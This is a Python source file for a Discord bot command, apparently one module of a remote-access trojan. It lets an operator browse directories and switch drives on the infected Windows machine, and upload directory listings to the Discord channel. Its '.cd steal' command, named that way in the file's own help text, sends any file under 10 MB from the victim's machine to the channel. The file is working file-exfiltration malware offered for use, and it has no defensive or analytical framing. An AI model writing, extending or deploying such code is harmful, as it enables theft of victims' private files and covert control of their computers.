import os
import discord

current_directory = os.getcwd()

async def cd_command(ctx, *, args: str):
    global current_directory

    if args.startswith("steal "):
        file_path = args[len("steal "):].strip()
        if os.path.exists(file_path):
            if os.path.getsize(file_path) <= 10 * 1024 * 1024:  # Check if the file size is under 10 MB
                await ctx.send(file=discord.File(file_path))
            else:
                await ctx.send("File size exceeds 10 MB, unable to send.")
        else:
            await ctx.send(f"File not found: {file_path}")

    elif args == "back":
        parent_directory = os.path.dirname(current_directory)
        if parent_directory != current_directory:
            current_directory = parent_directory
            os.chdir(current_directory)
            await ctx.send(f"Moved back to: {current_directory}")
        else:
            await ctx.send("Already at the root directory.")

    elif args == "help":
        help_message = (
            "Available commands:\n"
            ".cd <dirname> - Change to the specified directory.\n"
            ".cd back - Move back to the parent directory.\n"
            ".cd steal <file_path> - Steal the specified file and send as an attachment if under 10 MB.\n"
            ".cd list - List all files and folders in the current directory.\n"
            ".cd drive:<letter> - Switch to the specified drive."
        )
        await ctx.send(help_message)

    elif args.startswith("drive:"):
        drive = args.split(":")[1]
        if len(drive) == 1 and drive.isalpha():
            new_drive = f"{drive.upper()}:\\"
            if os.path.exists(new_drive):
                current_directory = new_drive
                os.chdir(current_directory)
                await ctx.send(f"Switched to drive: {new_drive}")
            else:
                await ctx.send(f"Drive not found: {new_drive}")
        else:
            await ctx.send("Invalid drive specified. Use the format: drive:<letter>")

    elif args == "list":
        try:
            items = os.listdir(current_directory)
            with open("directory_list.txt", "w") as f:
                for item in items:
                    full_path = os.path.join(current_directory, item)
                    f.write(f"{full_path}\n")
            await ctx.send(file=discord.File("directory_list.txt"))
        except Exception as e:
            await ctx.send(f"Error listing items: {e}")

    else:
        new_path = os.path.join(current_directory, args)
        if os.path.isdir(new_path):
            current_directory = new_path
            os.chdir(current_directory)
            await ctx.send(f"Changed directory to: {current_directory}")
        else:
            await ctx.send(f"Not a directory: {args}")
